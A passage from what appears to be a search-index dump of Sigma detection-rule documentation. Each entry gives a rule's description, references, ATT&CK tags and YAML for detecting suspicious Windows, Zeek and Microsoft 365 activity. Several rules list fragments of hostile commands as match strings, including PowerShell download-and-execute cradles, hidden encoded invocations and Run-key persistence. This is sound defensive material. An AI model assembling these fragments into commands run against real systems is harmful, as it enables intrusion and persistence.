unusual for the user. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Suspicious OAuth app file download activities\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.exfiltration ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_suspicious_oauth_app_file_download_activities.yml/","tags":["attack.exfiltration"],"title":"Suspicious OAuth App File Download Activities"},{"categories":null,"contents":"Use OfflineScannerShell.exe to execute mpclient.dll library in the current working directory\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/ Raw rule (edit) title: Suspicious OfflineScannerShell.exe Execution From Another Folder id: 02b18447-ea83-4b1b-8805-714a8a34546a status: experimental description: Use OfflineScannerShell.exe to execute mpclient.dll library in the current working directory references: - https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/ author: frack113 date: 2022/03/06 logsource: category: process_creation product: windows detection: lolbas: Image|endswith: \u0026#39;\\OfflineScannerShell.exe\u0026#39; filter_correct: CurrentDirectory: \u0026#39;C:\\Program Files\\Windows Defender\\Offline\\\u0026#39; filter_missing: CurrentDirectory: null condition: lolbas and not 1 of filter_* falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_offlinescannershell.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Suspicious OfflineScannerShell.exe Execution From Another Folder"},{"categories":null,"contents":"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nKnown false-positives Other SMTP tools References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp https://www.ietf.org/rfc/rfc2821.txt Raw rule (edit) title: Suspicious Outbound SMTP Connections id: 9976fa64-2804-423c-8a5b-646ade840773 status: experimental description: | Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp - https://www.ietf.org/rfc/rfc2821.txt author: frack113 date: 2022/01/07 modified: 2022/02/16 logsource: category: network_connection product: windows detection: selection: DestinationPort: - 25 - 587 - 465 - 2525 Initiated: \u0026#39;true\u0026#39; filter_clients: Image|endswith: - \\thunderbird.exe - \\outlook.exe filter_mailserver: Image|startswith: \u0026#39;C:\\Program Files\\Microsoft\\Exchange Server\\\u0026#39; condition: selection and not 1 of filter* falsepositives: - Other SMTP tools level: medium tags: - attack.exfiltration - attack.t1048.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_susp_outbound_smtp_connections.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"Suspicious Outbound SMTP Connections"},{"categories":null,"contents":"Detects a suspicious parent of csc.exe, which could by a sign of payload delivery\nKnown false-positives Unknown References https://twitter.com/SBousseaden/status/1094924091256176641 Raw rule (edit) title: Suspicious Parent of Csc.exe id: b730a276-6b63-41b8-bcf8-55930c8fc6ee status: test description: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery author: Florian Roth references: - https://twitter.com/SBousseaden/status/1094924091256176641 date: 2019/02/11 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\csc.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.005 - attack.t1059.007 - attack.defense_evasion - attack.t1218.005 - attack.t1027.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_csc.yml/","tags":["attack.execution","attack.t1059.005","attack.t1059.007","attack.defense_evasion","attack.t1218.005","attack.t1027.004"],"title":"Suspicious Parent of Csc.exe"},{"categories":null,"contents":"A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file.\nKnown false-positives System administrators managing certififcates. References https://github.com/OTRF/detection-hackathon-apt29/issues/14 https://threathunterplaybook.com/evals/apt29/detections/6.B.1_6392C9F1-D975-4F75-8A70-433DEDD7F622.html Raw rule (edit) title: Suspicious PFX File Creation id: dca1b3e8-e043-4ec8-85d7-867f334b5724 status: test description: A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/14 - https://threathunterplaybook.com/evals/apt29/detections/6.B.1_6392C9F1-D975-4F75-8A70-433DEDD7F622.html date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;.pfx\u0026#39; condition: selection falsepositives: - System administrators managing certififcates. level: medium tags: - attack.credential_access - attack.t1552.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_pfx_file_creation.yml/","tags":["attack.credential_access","attack.t1552.004"],"title":"Suspicious PFX File Creation"},{"categories":null,"contents":"Detects suspicious Plink tunnel remote forarding to a local port\nKnown false-positives Administrative activity using a remote port forwarding to a local port References https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/ https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d Raw rule (edit) title: Suspicious Plink Remote Forwarding id: 48a61b29-389f-4032-b317-b30de6b95314 status: experimental description: Detects suspicious Plink tunnel remote forarding to a local port references: - https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/ - https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d author: Florian Roth date: 2021/01/19 tags: - attack.command_and_control - attack.t1572 - attack.lateral_movement - attack.t1021.001 logsource: category: process_creation product: windows detection: selection: Description: \u0026#39;Command-line SSH, Telnet, and Rlogin client\u0026#39; CommandLine|contains: \u0026#39; -R \u0026#39; condition: selection falsepositives: - Administrative activity using a remote port forwarding to a local port level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_plink_remote_forward.yml/","tags":["attack.command_and_control","attack.t1572","attack.lateral_movement","attack.t1021.001"],"title":"Suspicious Plink Remote Forwarding"},{"categories":null,"contents":"Detects the PowerShell command lines with reversed strings\nKnown false-positives Unlikely References https://2019.offzone.moscow/ru/report/hunting-for-powershell-abuses/ https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=66 Raw rule (edit) title: Suspicious PowerShell Cmdline id: b6b49cd1-34d6-4ead-b1bf-176e9edba9a4 status: test description: Detects the PowerShell command lines with reversed strings author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton references: - https://2019.offzone.moscow/ru/report/hunting-for-powershell-abuses/ - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=66 date: 2020/10/11 modified: 2022/02/21 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;hctac\u0026#39; - \u0026#39;kearb\u0026#39; - \u0026#39;dnammoc\u0026#39; - \u0026#39;ekovn\u0026#39; - \u0026#39;eliFd\u0026#39; - \u0026#39;rahc\u0026#39; - \u0026#39;etirw\u0026#39; - \u0026#39;golon\u0026#39; - \u0026#39;tninon\u0026#39; - \u0026#39;eddih\u0026#39; - \u0026#39;tpircS\u0026#39; - \u0026#39;ssecorp\u0026#39; - \u0026#39;llehsrewop\u0026#39; - \u0026#39;esnopser\u0026#39; - \u0026#39;daolnwod\u0026#39; - \u0026#39;tneilCbeW\u0026#39; - \u0026#39;tneilc\u0026#39; - \u0026#39;ptth\u0026#39; - \u0026#39;elifotevas\u0026#39; - \u0026#39;46esab\u0026#39; - \u0026#39;htaPpmeTteG\u0026#39; - \u0026#39;tcejbO\u0026#39; - \u0026#39;maerts\u0026#39; - \u0026#39;hcaerof\u0026#39; - \u0026#39;ekovni\u0026#39; - \u0026#39;retupmoc\u0026#39; filter_1: CommandLine|contains: \u0026#39;-EncodedCommand\u0026#39; condition: selection and not 1 of filter* falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_cmdline_reversed_strings.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Cmdline"},{"categories":null,"contents":"Detects the PowerShell command lines with special characters\nKnown false-positives Unlikely Amazon SSM Document Worker Windows Defender ATP References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=64 Raw rule (edit) title: Suspicious PowerShell Command Line id: d7bcd677-645d-4691-a8d4-7a5602b780d1 status: test description: Detects the PowerShell command lines with special characters author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton (fp) references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=64 date: 2020/10/15 modified: 2022/03/04 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|re: \u0026#39;.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\u0026#39; selection2: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|re: \u0026#39;.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\u0026#39; selection3: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|re: \u0026#39;.*{.*{.*{.*{.*{.*\u0026#39; selection4: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|re: \u0026#39;.*\\^.*\\^.*\\^.*\\^.*\\^.*\u0026#39; selection5: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|re: \u0026#39;.*`.*`.*`.*`.*`.*\u0026#39; filter_amazonSSM: ParentImage: C:\\Program Files\\Amazon\\SSM\\ssm-document-worker.exe filter_windef_atp: CommandLine|contains: \u0026#39;new EventSource(\u0026#34;Microsoft.Windows.Sense.Client.Management\u0026#34;\u0026#39; condition: (selection1 or selection2 or selection3 or selection4 or selection5) and not filter_amazonSSM and not (selection3 and filter_windef_atp) falsepositives: - Unlikely - Amazon SSM Document Worker # fp example: powershell \u0026#34; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 $keyExists = Test-Path \u0026#34;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup\\OC Manager\\Subcomponents\u0026#34; $jsonObj = @() if ($keyExists) { $key = Get-Item \u0026#34;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup\\OC Manager\\Subcomponents\u0026#34; $valueNames = $key.GetValueNames(); foreach ($valueName in $valueNames) { $value = $key.GetValue($valueName); if ($value -gt 0) { $installed = \u0026#34;True\u0026#34; } else { $installed = \u0026#34;False\u0026#34; } $jsonObj += @\u0026#34; {\u0026#34;Name\u0026#34;: \u0026#34;$valueName\u0026#34;, \u0026#34;Installed\u0026#34;: \u0026#34;$installed\u0026#34;} \u0026#34;@ } } $result = $jsonObj -join \u0026#34;,\u0026#34; $result = \u0026#34;[\u0026#34; + $result + \u0026#34;]\u0026#34; [Console]::WriteLine($result) - Windows Defender ATP level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Command Line"},{"categories":null,"contents":"Detects suspicious PowerShell download command\nKnown false-positives PowerShell scripts that download content from the Internet Raw rule (edit) title: Suspicious PowerShell Download id: 65531a81-a694-4e31-ae04-f8ba5bc33759 status: deprecated description: Detects suspicious PowerShell download command tags: - attack.execution - attack.t1059.001 author: Florian Roth date: 2017/03/05 modified: 2021/09/21 logsource: product: windows service: powershell detection: webclient: - \u0026#39;System.Net.WebClient\u0026#39; download: - \u0026#39;.DownloadFile(\u0026#39; - \u0026#39;.DownloadString(\u0026#39; condition: webclient and download falsepositives: - PowerShell scripts that download content from the Internet level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/powershell_suspicious_download.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Download"},{"categories":null,"contents":"Detects suspicious PowerShell invocation command parameters\nKnown false-positives Penetration tests Raw rule (edit) title: Suspicious PowerShell Invocations - Specific id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c status: deprecated description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule), Jonhnathan Ribeiro date: 2017/03/05 modified: 2022/02/21 logsource: product: windows service: powershell definition: Script block logging must be enabled for 4104, Module Logging must be enabled for 4103 detection: convert_b64: - \u0026#39;-nop\u0026#39; - \u0026#39; -w \u0026#39; - \u0026#39;hidden\u0026#39; - \u0026#39; -c \u0026#39; - \u0026#39;[Convert]::FromBase64String\u0026#39; iex_selection: - \u0026#39; -w \u0026#39; - \u0026#39;hidden\u0026#39; - \u0026#39;-noni\u0026#39; - \u0026#39;-nop\u0026#39; - \u0026#39; -c \u0026#39; - \u0026#39;iex\u0026#39; - \u0026#39;New-Object\u0026#39; enc_selection: - \u0026#39; -w \u0026#39; - \u0026#39;hidden\u0026#39; - \u0026#39;-ep\u0026#39; - \u0026#39;bypass\u0026#39; - \u0026#39;-Enc\u0026#39; reg_selection: - \u0026#39;powershell\u0026#39; - \u0026#39;reg\u0026#39; - \u0026#39;add\u0026#39; - \u0026#39;HKCU\\software\\microsoft\\windows\\currentversion\\run\u0026#39; webclient_selection: - \u0026#39;bypass\u0026#39; - \u0026#39;-noprofile\u0026#39; - \u0026#39;-windowstyle\u0026#39; - \u0026#39;hidden\u0026#39; - \u0026#39;new-object\u0026#39; - \u0026#39;system.net.webclient\u0026#39; - \u0026#39;.download\u0026#39; iex_webclient: - \u0026#39;iex\u0026#39; - \u0026#39;New-Object\u0026#39; - \u0026#39;Net.WebClient\u0026#39; - \u0026#39;.Download\u0026#39; filter_chocolatey: - \u0026#34;(New-Object System.Net.WebClient).DownloadString(\u0026#39;https://community.chocolatey.org/install.ps1\u0026#34; - \u0026#34;(New-Object System.Net.WebClient).DownloadString(\u0026#39;https://chocolatey.org/install.ps1\u0026#39;)\u0026#34; - \u0026#39;Write-ChocolateyWarning\u0026#39; condition: (all of convert_b64 or all of iex_selection or all of enc_selection or all of reg_selection or all of webclient_selection or all of iex_webclient) and not 1 of filter_* falsepositives: - Penetration tests level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/powershell_suspicious_invocation_specific.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Invocations - Specific"},{"categories":null,"contents":"Detects a PowerShell New-MailboxExportRequest that exports a mailbox to a local share, as used in ProxyShell exploitations\nKnown false-positives unknown References https://youtu.be/5mqid-7zp8k?t=2481 https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 Raw rule (edit) title: Suspicious PowerShell Mailbox Export to Share id: 889719ef-dd62-43df-86c3-768fb08dc7c0 status: experimental description: Detects a PowerShell New-MailboxExportRequest that exports a mailbox to a local share, as used in ProxyShell exploitations references: - https://youtu.be/5mqid-7zp8k?t=2481 - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 author: Florian Roth date: 2021/08/07 modified: 2022/02/01 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;New-MailboxExport\u0026#39; - \u0026#39; -Mailbox \u0026#39; - \u0026#39; -FilePath \\\\\\\\127.0.0.1\\\\C$\u0026#39; condition: selection falsepositives: - unknown level: critical fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1505.003 - attack.resource_development - attack.t1584.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mailboxexport_share.yml/","tags":["attack.persistence","attack.t1505.003","attack.resource_development","attack.t1584.006"],"title":"Suspicious PowerShell Mailbox Export to Share"},{"categories":null,"contents":"Detects a suspicious printer driver installation with an empty Manufacturer value\nKnown false-positives Alerts on legitimate printer drivers that do not set any more details in the Manufacturer value References https://twitter.com/SBousseaden/status/1410545674773467140 Raw rule (edit) title: Suspicious Printer Driver Empty Manufacturer id: e0813366-0407-449a-9869-a2db1119dc41 status: test description: Detects a suspicious printer driver installation with an empty Manufacturer value author: Florian Roth references: - https://twitter.com/SBousseaden/status/1410545674773467140 date: 2020/07/01 modified: 2022/02/09 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains|all: - \u0026#39;\\Control\\Print\\Environments\\Windows x64\\Drivers\u0026#39; - \u0026#39;\\Manufacturer\u0026#39; Details: \u0026#39;(Empty)\u0026#39; filter_cutepdf: TargetObject|contains: \u0026#39;\\CutePDF Writer v4.0\\\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Alerts on legitimate printer drivers that do not set any more details in the Manufacturer value level: high tags: - attack.privilege_escalation - attack.t1574 - cve.2021.1675 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_printer_driver.yml/","tags":["attack.privilege_escalation","attack.t1574","cve.2021.1675"],"title":"Suspicious Printer Driver Empty Manufacturer"},{"categories":null,"contents":"Detects new commands that add new printer port which point to suspicious file\nKnown false-positives New printer port install on host References https://windows-internals.com/printdemon-cve-2020-1048/ Raw rule (edit) title: Suspicious PrinterPorts Creation (CVE-2020-1048) id: cc08d590-8b90-413a-aff6-31d1a99678d7 status: test description: Detects new commands that add new printer port which point to suspicious file author: EagleEye Team, Florian Roth references: - https://windows-internals.com/printdemon-cve-2020-1048/ date: 2020/05/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;Add-PrinterPort -Name\u0026#39; selection2: CommandLine|contains: - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.bat\u0026#39; selection3: CommandLine|contains: - \u0026#39;Generic / Text Only\u0026#39; condition: ( selection1 and selection2 ) or selection3 falsepositives: - New printer port install on host level: high tags: - attack.persistence - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_1048.yml/","tags":["attack.persistence","attack.execution","attack.t1059.001"],"title":"Suspicious PrinterPorts Creation (CVE-2020-1048)"},{"categories":null,"contents":"Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder. This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\nKnown false-positives Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don\u0026rsquo;t rely on it. References https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ Raw rule (edit) title: Suspicious PROCEXP152.sys File Created In TMP id: 3da70954-0f2c-4103-adff-b7440368f50e status: test description: Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder. This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU. author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ date: 2019/04/08 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection_1: TargetFilename|contains: \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; TargetFilename|endswith: \u0026#39;PROCEXP152.sys\u0026#39; selection_2: Image|contains: - \u0026#39;\\procexp64.exe\u0026#39; - \u0026#39;\\procexp.exe\u0026#39; - \u0026#39;\\procmon64.exe\u0026#39; - \u0026#39;\\procmon.exe\u0026#39; condition: selection_1 and not selection_2 falsepositives: - Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don\u0026#39;t rely on it. level: medium tags: - attack.t1562.001 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_procexplorer_driver_created_in_tmp_folder.yml/","tags":["attack.t1562.001","attack.defense_evasion"],"title":"Suspicious PROCEXP152.sys File Created In TMP"},{"categories":null,"contents":"detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one\nKnown false-positives nothing observed so far References https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html Raw rule (edit) title: Suspicious PsExec Execution id: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82 status: test description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one author: Samir Bousseaden references: - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html date: 2019/04/03 modified: 2021/12/08 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection1: EventID: 5145 ShareName: \\\\\\*\\IPC$ RelativeTargetName|endswith: - \u0026#39;-stdin\u0026#39; - \u0026#39;-stdout\u0026#39; - \u0026#39;-stderr\u0026#39; filter: RelativeTargetName|startswith: \u0026#39;PSEXESVC\u0026#39; condition: selection1 and not filter falsepositives: - nothing observed so far level: high tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_psexec.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Suspicious PsExec Execution"},{"categories":null,"contents":"detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one\nKnown false-positives nothing observed so far References https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_psexec.yml Raw rule (edit) title: Suspicious PsExec Execution - Zeek id: f1b3a22a-45e6-4004-afb5-4291f9c21166 status: test description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one author: \u0026#39;Samir Bousseaden, @neu5ron\u0026#39; references: - https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_psexec.yml date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection1: path|contains|all: - \u0026#39;\\\\\u0026#39; - \u0026#39;\\IPC$\u0026#39; name|endswith: - \u0026#39;-stdin\u0026#39; - \u0026#39;-stdout\u0026#39; - \u0026#39;-stderr\u0026#39; selection2: name|contains|all: - \u0026#39;\\\\\u0026#39; - \u0026#39;\\IPC$\u0026#39; path|startswith: \u0026#39;PSEXESVC\u0026#39; condition: selection1 and not selection2 falsepositives: - nothing observed so far level: high tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_susp_psexec.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Suspicious PsExec Execution - Zeek"},{"categories":null,"contents":"Use of reg to get MachineGuid information\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery Raw rule (edit) title: Suspicious Query of MachineGUID id: f5240972-3938-4e56-8e4b-e33893176c1f status: experimental description: Use of reg to get MachineGuid information author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\reg.exe CommandLine|contains|all: - \u0026#39;SOFTWARE\\Microsoft\\Cryptography\u0026#39; - \u0026#39;/v \u0026#39; - \u0026#39;MachineGuid\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_machineguid.yml/","tags":["attack.discovery","attack.t1082"],"title":"Suspicious Query of MachineGUID"},{"categories":null,"contents":"Detects when the registration of a VSS/VDS Provider as a COM+ application.\nKnown false-positives None References https://twitter.com/sblmsrsn/status/1456613494783160325?s=20 https://ss64.com/vb/cscript.html Raw rule (edit) title: Suspicious Registration via cscript.exe id: 28c8f68b-098d-45af-8d43-8089f3e35403 description: Detects when the registration of a VSS/VDS Provider as a COM+ application. status: experimental author: Austin Songer @austinsonger date: 2021/11/05 references: - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20 - https://ss64.com/vb/cscript.html logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains: \u0026#39;-register\u0026#39; selection2: CommandLine|contains: - \u0026#39;\\Windows Kits\\10\\bin\\10.0.22000.0\\x64\u0026#39; - \u0026#39;\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\u0026#39; - \u0026#39;\\Windows Kits\\10\\bin\\10.0.17763.0\\x64\u0026#39; condition: selection1 and selection2 fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1218 level: medium falsepositives: - None ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_registration_via_cscript.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Suspicious Registration via cscript.exe"},{"categories":null,"contents":"Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in Windows Spooler Service\nKnown false-positives Account fallback reasons (after failed login with specific account) References https://twitter.com/KevTheHermit/status/1410203844064301056 https://github.com/hhlxf/PrintNightmare https://github.com/afwu/PrintNightmare Raw rule (edit) title: Suspicious Rejected SMB Guest Logon From IP id: 71886b70-d7b4-4dbf-acce-87d2ca135262 description: Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in Windows Spooler Service author: Florian Roth, KevTheHermit, fuzzyf10w status: experimental level: medium references: - https://twitter.com/KevTheHermit/status/1410203844064301056 - https://github.com/hhlxf/PrintNightmare - https://github.com/afwu/PrintNightmare date: 2021/06/30 modified: 2021/07/05 logsource: product: windows service: smbclient-security detection: selection: EventID: 31017 Description|contains: \u0026#39;Rejected an insecure guest logon\u0026#39; UserName: \u0026#39;\u0026#39; ServerName|startswith: \u0026#39;\\1\u0026#39; condition: selection fields: - Computer - User falsepositives: - Account fallback reasons (after failed login with specific account) tags: - attack.credential_access - attack.t1110.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/smbclient/win_susp_failed_guest_logon.yml/","tags":["attack.credential_access","attack.t1110.001"],"title":"Suspicious Rejected SMB Guest Logon From IP"},{"categories":null,"contents":"Detects suspicious processes logging on with explicit credentials\nKnown false-positives Administrators that use the RunAS command or scheduled tasks References https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view Raw rule (edit) title: Suspicious Remote Logon with Explicit Credentials id: 941e5c45-cda7-4864-8cea-bbb7458d194a status: experimental description: Detects suspicious processes logging on with explicit credentials references: - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view author: \u0026#39;oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st\u0026#39; date: 2020/10/05 modified: 2021/11/12 tags: - attack.t1078 - attack.lateral_movement logsource: product: windows service: security detection: selection: EventID: 4648 ProcessName|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\pwsh.exe\u0026#39; - \u0026#39;\\winrs.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; - \u0026#39;\\reg.exe\u0026#39; filter: TargetServerName: \u0026#39;localhost\u0026#39; condition: selection and not filter falsepositives: - Administrators that use the RunAS command or scheduled tasks level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_logon_explicit_credentials.yml/","tags":["attack.t1078","attack.lateral_movement"],"title":"Suspicious Remote Logon with Explicit Credentials"},{"categories":null,"contents":"Replace.exe is used to replace file with another file\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Replace/ Raw rule (edit) title: Suspicious Replace.exe Execution id: 9292293b-8496-4715-9db6-37028dcda4b3 status: experimental description: Replace.exe is used to replace file with another file references: - https://lolbas-project.github.io/lolbas/Binaries/Replace/ author: frack113 date: 2022/03/06 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains|all: - \u0026#39;replace \u0026#39; - \u0026#39;/A\u0026#39; condition: lolbas falsepositives: - unknown level: medium tags: - attack.command_and_control - 